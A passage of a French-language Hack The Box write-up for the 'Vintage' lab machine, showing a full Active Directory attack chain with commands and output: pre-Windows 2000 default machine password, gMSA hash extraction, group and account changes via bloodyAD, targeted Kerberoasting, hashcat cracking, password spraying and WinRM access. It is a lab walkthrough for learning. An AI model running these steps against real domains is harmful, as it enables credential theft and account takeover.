+<p>Je vois que dans le groupe <code>Domain Computers</code>, il y a <code>fs01$</code> qui est membre du groupe <code>Pre Windows 2000 Compatible Access</code>. Donc son mot de passe est <code>fs01</code>. Plus d&rsquo;informations sur ce groupe sur <a href="https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers#practice" target="_blank" rel="noopener noreffer ">thehackerrecipes</a>. Il peut aussi lire les mot de passe GMSA. La machine gms01$ peut s&rsquo;ajouter dans le groupe <code>SERVICEMANAGERS</code>. Les membres de ce groupe ont le droit <code>GenericAll</code> sur les comptes de service, donc peuvent récupérer les hash de ces comptes.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Vintage/Vintage-1.png"
+        data-srcset="/images/Vintage/Vintage-1.png, /images/Vintage/Vintage-1.png 1.5x, /images/Vintage/Vintage-1.png 2x"
+        data-sizes="auto"
+        alt="/images/Vintage/Vintage-1.png"
+        title="/images/Vintage/Vintage-1.png" width="1594" height="786" /></p>
+<p>Je vois aussi que le groupe <code>SERVICEMANAGERS</code> contient trois membres.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Vintage/Vintage-3.png"
+        data-srcset="/images/Vintage/Vintage-3.png, /images/Vintage/Vintage-3.png 1.5x, /images/Vintage/Vintage-3.png 2x"
+        data-sizes="auto"
+        alt="/images/Vintage/Vintage-3.png"
+        title="/images/Vintage/Vintage-3.png" width="576" height="390" /></p>
+<p>Je vois aussi que parmi les comptes de service, seul <code>svc_sql</code> est désactivé. Donc il devrait avoir comme valeur <code>ACCOUNTDISABLE</code> pour la propriété <code>userAccountControl</code>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Vintage/Vintage-2.png"
+        data-srcset="/images/Vintage/Vintage-2.png, /images/Vintage/Vintage-2.png 1.5x, /images/Vintage/Vintage-2.png 2x"
+        data-sizes="auto"
+        alt="/images/Vintage/Vintage-2.png"
+        title="/images/Vintage/Vintage-2.png" width="346" height="426" /></p>
+<p>Le chemin d&rsquo;attaque est le suivant :</p>
+<ol>
+<li>Récupérer les identifiants GMSA</li>
+<li>Ajouter le compte <code>gmsa01$</code> dans le groupe <code>SERVICEMANGERS</code></li>
+<li>Activer le compte <code>svc_sql</code></li>
+<li><code>Targeted Kerberoast</code> sur les membres du groupe <code>SERVICEMANAGERS</code></li>
+</ol>
+<h3 id="récupérer-les-gmsa">Récupérer les GMSA</h3>
+<p>Confirmation des identifiants <code>fs01$:fs01</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  nxc smb dc01.vintage.htb -u <span class="s1">&#39;fs01$&#39;</span> -p <span class="s1">&#39;fs01&#39;</span> -k                                                                                       <span class="m">1</span> ↵
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:dc01<span class="o">)</span> <span class="o">(</span>domain:vintage.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             <span class="o">[</span>+<span class="o">]</span> vintage.htb<span class="se">\f</span>s01$:fs01</span></span></code></pre></div></div>
+<p>Je génère alors un ticket pour <code>fs01$</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  getTGT.py <span class="s1">&#39;vintage.htb/fs01$:fs01&#39;</span>
+</span></span><span class="line"><span class="cl">Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in fs01$.ccache
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>fs01<span class="se">\$</span>.ccache
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  klist
+</span></span><span class="line"><span class="cl">Ticket cache: FILE:fs01$.ccache
+</span></span><span class="line"><span class="cl">Default principal: fs01<span class="nv">$@</span>VINTAGE.HTB
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Valid starting       Expires              Service principal
+</span></span><span class="line"><span class="cl">07/23/2025 10:52:16  07/23/2025 20:52:16  krbtgt/VINTAGE.HTB@VINTAGE.HTB
+</span></span><span class="line"><span class="cl">        renew <span class="k">until</span> 07/24/2025 10:52:15</span></span></code></pre></div></div>
+<p>Je récupère les identifiants GMSA avec <code>bloodyAD</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  bloodyAD --host <span class="s1">&#39;dc01.vintage.htb&#39;</span> --dc-ip <span class="s1">&#39;10.129.231.205&#39;</span> -d <span class="s1">&#39;vintage.htb&#39;</span> -k get object <span class="s1">&#39;GMSA01$&#39;</span> --attr msDS-ManagedPassword       <span class="m">1</span> ↵
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">distinguishedName: <span class="nv">CN</span><span class="o">=</span>gMSA01,CN<span class="o">=</span>Managed Service Accounts,DC<span class="o">=</span>vintage,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:5008d30496b4c5069ce1fc187b5b5960
+</span></span><span class="line"><span class="cl">msDS-ManagedPassword.B64ENCODED: bf1cBrHgnrALWx1WFDnvyHlBZcnkH+3VWYL4yBPdXcXgE7ENWHpWc03uhzxvXLrT5eh71spfFnajFbFuYuHCk2bczzZnBOeruwpF5vpYWmmULhBQoBvyxVWvr2MwOcHOyS7LQYMZdAlJ8k0Dg/2J3ie5SJFNM+Sb7M+Nx+zLSG3A7lYcdYcLS5ed0D8jw1TFB4g4+S0pqNRMjXp2b3HpJbHBFnn6wTDKrDiOZaG/DJHDODoCG0oAncE43Rtpf5lve49jd+m8QGqbQXmQEqCTH/CPS5/n6TKQgqzIMyE8LaxMK3s4UXJAbh8wlskq7j27jD61W7V0JMeMT/dvQu20Jg<span class="o">==</span></span></span></code></pre></div></div>
+<p>Je génère un TGT pour <code>gmsa01$</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  getTGT.py <span class="s1">&#39;vintage.htb/gmsa01$&#39;</span> -hashes <span class="s1">&#39;:5008d30496b4c5069ce1fc187b5b5960&#39;</span>
+</span></span><span class="line"><span class="cl">Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in gmsa01$.ccache
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>gmsa01<span class="se">\$</span>.ccache
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  klist
+</span></span><span class="line"><span class="cl">Ticket cache: FILE:gmsa01$.ccache
+</span></span><span class="line"><span class="cl">Default principal: gmsa01<span class="nv">$@</span>VINTAGE.HTB
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Valid starting       Expires              Service principal
+</span></span><span class="line"><span class="cl">07/23/2025 11:05:20  07/23/2025 21:05:20  krbtgt/VINTAGE.HTB@VINTAGE.HTB
+</span></span><span class="line"><span class="cl">        renew <span class="k">until</span> 07/24/2025 11:05:20</span></span></code></pre></div></div>
+<h3 id="ajouter-gmsa01-dans-le-groupe-servicemanagers">Ajouter gmsa01$ dans le groupe SERVICEMANAGERS</h3>
+<p>J&rsquo;ajoute <code>gmsa01$</code> dans le groupe <code>SERVICEMANAGERS</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  bloodyAD --host <span class="s1">&#39;dc01.vintage.htb&#39;</span> --dc-ip <span class="s1">&#39;10.129.231.205&#39;</span> -d <span class="s1">&#39;vintage.htb&#39;</span> -k add groupMember <span class="s1">&#39;SERVICEMANAGERS&#39;</span> <span class="s1">&#39;gmsa01$&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> gmsa01$ added to SERVICEMANAGERS</span></span></code></pre></div></div>
+<h3 id="activer-svc_sql">Activer svc_sql</h3>
+<p>Avec <code>bloodyAD</code>, je retire la valeur <code>ACCOUNTDISABLE</code> de la propriété <code>userAccountControl</code> de <code>svc_sql</code>, ce qui le le réactive.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  bloodyAD --host <span class="s1">&#39;dc01.vintage.htb&#39;</span> --dc-ip <span class="s1">&#39;10.129.231.205&#39;</span> -d <span class="s1">&#39;vintage.htb&#39;</span> -k remove uac <span class="s1">&#39;svc_sql&#39;</span> -f ACCOUNTDISABLE
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> <span class="o">[</span><span class="s1">&#39;ACCOUNTDISABLE&#39;</span><span class="o">]</span> property flags removed from svc_sql<span class="err">&#39;</span>s userAccountControl</span></span></code></pre></div></div>
+<p>Je vérifie avec <code>bloodyAD</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  bloodyAD --host <span class="s1">&#39;dc01.vintage.htb&#39;</span> --dc-ip <span class="s1">&#39;10.129.231.205&#39;</span> -d <span class="s1">&#39;vintage.htb&#39;</span> -k get object <span class="s1">&#39;svc_sql&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">distinguishedName: <span class="nv">CN</span><span class="o">=</span>svc_sql,OU<span class="o">=</span>Pre-Migration,DC<span class="o">=</span>vintage,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">&lt;snip&gt;
+</span></span><span class="line"><span class="cl">userAccountControl: NORMAL_ACCOUNT<span class="p">;</span> DONT_EXPIRE_PASSWORD
+</span></span><span class="line"><span class="cl">whenChanged: 2025-07-23 09:38:23+00:00
+</span></span><span class="line"><span class="cl">whenCreated: 2024-06-06 13:45:27+00:00</span></span></code></pre></div></div>
+<h3 id="targeted-kerberoasting">Targeted Kerberoasting</h3>
+<p>Ensuite avec le ticket de <code>gmsa01$</code>, je récupère les hash des comptes <code>svc</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  targetedKerberoast.py -v -d <span class="s1">&#39;vintage.htb&#39;</span> -k --no-pass --dc-host dc01.vintage.htb -o Kerberoastables.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting kerberoast attacks
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Fetching usernames from Active Directory with LDAP
+</span></span><span class="line"><span class="cl"><span class="o">[</span>VERBOSE<span class="o">]</span> SPN added successfully <span class="k">for</span> <span class="o">(</span>svc_sql<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Writing <span class="nb">hash</span> to file <span class="k">for</span> <span class="o">(</span>svc_sql<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>VERBOSE<span class="o">]</span> SPN removed successfully <span class="k">for</span> <span class="o">(</span>svc_sql<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>VERBOSE<span class="o">]</span> SPN added successfully <span class="k">for</span> <span class="o">(</span>svc_ldap<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Writing <span class="nb">hash</span> to file <span class="k">for</span> <span class="o">(</span>svc_ldap<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>VERBOSE<span class="o">]</span> SPN removed successfully <span class="k">for</span> <span class="o">(</span>svc_ldap<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>VERBOSE<span class="o">]</span> SPN added successfully <span class="k">for</span> <span class="o">(</span>svc_ark<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Writing <span class="nb">hash</span> to file <span class="k">for</span> <span class="o">(</span>svc_ark<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>VERBOSE<span class="o">]</span> SPN removed successfully <span class="k">for</span> <span class="o">(</span>svc_ark<span class="o">)</span></span></span></code></pre></div></div>
+<p>Je crack alors les hash et je trouve le mot de passe <code>Zer0the0ne</code> de <code>svc_sql</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  hashcat -m <span class="m">13100</span> Kerberoastables.txt /usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">hashcat <span class="o">(</span>v6.2.6<span class="o">)</span> starting
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">OpenCL API <span class="o">(</span>OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG<span class="o">)</span> - Platform <span class="c1">#1 [The pocl project]</span>
+</span></span><span class="line"><span class="cl"><span class="o">==================================================================================================================================================</span>
+</span></span><span class="line"><span class="cl">* Device <span class="c1">#1: pthread-haswell-AMD Ryzen 7 5825U with Radeon Graphics, 2749/5562 MB (1024 MB allocatable), 16MCU</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Minimum password length supported by kernel: <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Maximum password length supported by kernel: <span class="m">256</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Hashfile <span class="s1">&#39;Kerberoastables.txt&#39;</span> on line <span class="m">1</span> <span class="o">(</span><span class="nv">$krb5t</span>...a87e1904439bb6c146f450a58074b085<span class="o">)</span>: Separator unmatched
+</span></span><span class="line"><span class="cl">Hashes: <span class="m">3</span> digests<span class="p">;</span> <span class="m">3</span> unique digests, <span class="m">3</span> unique salts
+</span></span><span class="line"><span class="cl">Bitmaps: <span class="m">16</span> bits, <span class="m">65536</span> entries, 0x0000ffff mask, <span class="m">262144</span> bytes, 5/13 rotates
+</span></span><span class="line"><span class="cl">Rules: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Optimizers applied:
+</span></span><span class="line"><span class="cl">* Zero-Byte
+</span></span><span class="line"><span class="cl">* Not-Iterated
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ATTENTION! Pure <span class="o">(</span>unoptimized<span class="o">)</span> backend kernels selected.
+</span></span><span class="line"><span class="cl">Pure kernels can crack longer passwords, but drastically reduce performance.
+</span></span><span class="line"><span class="cl">If you want to switch to optimized kernels, append -O to your commandline.
+</span></span><span class="line"><span class="cl">See the above message to find out about the exact limits.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Watchdog: Hardware monitoring interface not found on your system.
+</span></span><span class="line"><span class="cl">Watchdog: Temperature abort trigger disabled.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host memory required <span class="k">for</span> this attack: <span class="m">4</span> MB
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Dictionary cache built:
+</span></span><span class="line"><span class="cl">* Filename..: /usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">* Passwords.: <span class="m">14344391</span>
+</span></span><span class="line"><span class="cl">* Bytes.....: <span class="m">139921497</span>
+</span></span><span class="line"><span class="cl">* Keyspace..: <span class="m">14344384</span>
+</span></span><span class="line"><span class="cl">* Runtime...: <span class="m">1</span> sec
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$krb5tgs$23$*</span>svc_sql<span class="nv">$VINTAGE</span>.HTB<span class="nv">$vintage</span>.htb/svc_sql*<span class="nv">$6</span>bbb6a170a087629ea84c5628d7addff<span class="nv">$9</span>db130be92574ac5467f33ccc54dceecf839702aae9784c8c49deeeacbdfc954ef10bcdabaf19a034f7ba3e6042958d64eaef2d48f47d5261ae15b1376ed4a83b4022ff080abdbe89f72ca58b75df2c8d0f32621d71a754f524b529078015eab12d6173c459a709fa21debcc6ad25fa1c022565d8c26aaa7bf6ba7627e9ff6c83880b697c42ffc61e5646960e572d5b69fbaaa309c0bcd77206b6b10a08483cb33ba11bc881d8dcce49ca0dcd8c0e8345e0b3dedb87ea52c1023f424135f7509caa8cbbf1f1ba73abef341fef51c598e6b2931469c5951cde5e58c26c3aa13e0d357f6224340d4b1c653abfc3426fc44deab78469b0db8a253ce8ecddf0e8e10fd5048e3e8d3f356ef7a222f4a184bce0869174360f1a75aa622d4827c88763cb00b7b1f0584934ba49a6d494a7c93e5ad7dd8a689ca07a921598e32cf2ef25ca7aff9944d29d806275ced71938e5d3aad0f701eef40ef000f7a013433b16838d4893c61f5e9a8c8a8f5295121967c6c4c8bb5cb3e8283191a56972c8da6af2383416c2fed19f01a7628b56752c8719d8d2f1073e6c9496e3b6edd76fe88d1b725d5a8dd662514b1db9d2459c4890d0d1554f53e978d196c8241012c162b1eb71e0006e94e0a4acbe6aced6ffcfd4de510b832d6c3d6c65ac0152275b81e2fea40c4b4faff9477837965e8e6ee21e4ae870c21fe833e648d740f523b241c7b023e9723b3e9a999cf8dcac0643aa8b30c889c40d0b6fa6aab2f03cb92d35699800ebdff1f8295d95473e8b073ef04897a5755c290bc339efda81012ca07405ec3b79820429a5b6ff086f6541b2bf6c34eb642a6f0710e15a58def9caf59faf09a7b798398911c605cb403490b440ff361f00e68307265656963dc4e0217420a174950ede175bb5383415cd818a34876ea884803f53d0b93e055c7cb3cfb983e6b44b0b958fb81681c89c2aea8adbd8548448cc8319abad101b7872df2ab478e6f83687821bbb5da97b8f6245f734e1f82a41930d05a4e055fa48b25001d06d3dfdf8a5e5a384dcd29765a6fa6e60cec322735a9379dccf1ec66978160a388d8e0dca8722ec8bd5f2e2f2c5297107bc879e52760b1df92481b94454a1d2fe04cbe3a6babf65c6b5c3f9b0e5b8a4c80cf2a24fcf29842d30b09c6c6fe7a0cb3407c545168fb027cfb74895466a943d4ffced1943ae17064a1bb9062daa42a27df5f7bc45677fcb6685a81f956bfb9b21c8f30b698e27996c0bf7451b33a7a3476e986c93d9242bb35ed5cc021ef57952130bc0d0152c69b855b9397b76cb3bf4197215af41989a78f4d6148f3f99eb83b023340c3f1602c2b4c716ba9e3b9544284e4252c45b062b2bdb885a0e2fb3b7ac4d13caf93780f35ca788bc0bf29bdb71d86ee8385d84bb9440d88a18a6c0e1bfb531168bd5eac023f676cdac2441b6f760b46eb:Zer0the0ne</span></span></code></pre></div></div>
+<h3 id="password-spray">Password Spray</h3>
+<p>Ensuite je teste le mot de passe sur tous les utilisateurs du domaine. Je vois alors que <code>C.Neri</code> utilise ce mot de passe.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  nxc smb dc01.vintage.htb -u users.txt -p <span class="s1">&#39;Zer0the0ne&#39;</span> -k --continue-on-success                                                         <span class="m">1</span> ↵
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:dc01<span class="o">)</span> <span class="o">(</span>domain:vintage.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             <span class="o">[</span>-<span class="o">]</span> vintage.htb<span class="se">\A</span>dministrator:Zer0the0ne KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             <span class="o">[</span>-<span class="o">]</span> vintage.htb<span class="se">\G</span>uest:Zer0the0ne KDC_ERR_CLIENT_REVOKED
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             <span class="o">[</span>-<span class="o">]</span> vintage.htb<span class="se">\k</span>rbtgt:Zer0the0ne KDC_ERR_CLIENT_REVOKED
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             <span class="o">[</span>-<span class="o">]</span> vintage.htb<span class="se">\M</span>.Rossi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             <span class="o">[</span>-<span class="o">]</span> vintage.htb<span class="se">\R</span>.Verdi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             <span class="o">[</span>-<span class="o">]</span> vintage.htb<span class="se">\L</span>.Bianchi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             <span class="o">[</span>-<span class="o">]</span> vintage.htb<span class="se">\G</span>.Viola:Zer0the0ne KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             <span class="o">[</span>+<span class="o">]</span> vintage.htb<span class="se">\C</span>.Neri:Zer0the0ne
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             <span class="o">[</span>-<span class="o">]</span> vintage.htb<span class="se">\P</span>.Rosa:Zer0the0ne KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             <span class="o">[</span>-<span class="o">]</span> vintage.htb<span class="se">\s</span>vc_sql:Zer0the0ne KDC_ERR_CLIENT_REVOKED
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             <span class="o">[</span>-<span class="o">]</span> vintage.htb<span class="se">\s</span>vc_ldap:Zer0the0ne KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             <span class="o">[</span>-<span class="o">]</span> vintage.htb<span class="se">\s</span>vc_ark:Zer0the0ne KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             <span class="o">[</span>-<span class="o">]</span> vintage.htb<span class="se">\C</span>.Neri_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         dc01.vintage.htb <span class="m">445</span>    dc01             <span class="o">[</span>-<span class="o">]</span> vintage.htb<span class="se">\L</span>.Bianchi_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED</span></span></code></pre></div></div>
+<p>Je vois que <code>C.Neri</code> est un membre du groupe <code>Remote Management Users</code>, donc je veux obtenir un shell avec lui.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Vintage/Vintage-4.png"
+        data-srcset="/images/Vintage/Vintage-4.png, /images/Vintage/Vintage-4.png 1.5x, /images/Vintage/Vintage-4.png 2x"
+        data-sizes="auto"
+        alt="/images/Vintage/Vintage-4.png"
+        title="/images/Vintage/Vintage-4.png" width="853" height="462" /></p>
+<p>Je génère alors un ticket pour <code>c.neri</code> et me connecte avec <code>evil-winrm</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
+</span></span><span class="line"><span class="cl">╰─➤  getTGT.py <span class="s1">&#39;vintage.htb/c.neri:Zer0the0ne&#39;</span>
+</span></span><span class="line"><span class="cl">Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in c.neri.ccache
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Vintage
